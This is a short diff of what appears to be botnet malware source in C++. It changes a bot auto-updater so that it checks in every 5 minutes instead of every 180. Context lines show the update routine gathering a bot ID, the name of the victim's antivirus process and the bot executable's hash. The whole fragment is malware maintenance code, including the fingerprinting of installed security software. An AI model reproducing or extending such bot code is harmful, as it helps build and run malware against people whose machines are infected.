@@ -27,7 +27,8 @@ namespace BotAutoUpdate
 TBotUpdater::TBotUpdater()
 	: TBotThread(false)
 {
-	Interval = 180 * 60 *1000;
+	Interval = 5 * 60 * 1000;
+//	Interval = 30 * 60 * 1000;
 
 	Start();
 }
@@ -68,6 +69,7 @@ void TBotUpdater::Update(DWORD &UpdateInterval)
 	string UID = GenerateBotID2();
 	string AV  = GetAntiVirusProcessName();
 	string MD5 = BOT::BotExeMD5();
+
 
 	TBotStrings Fields;
 
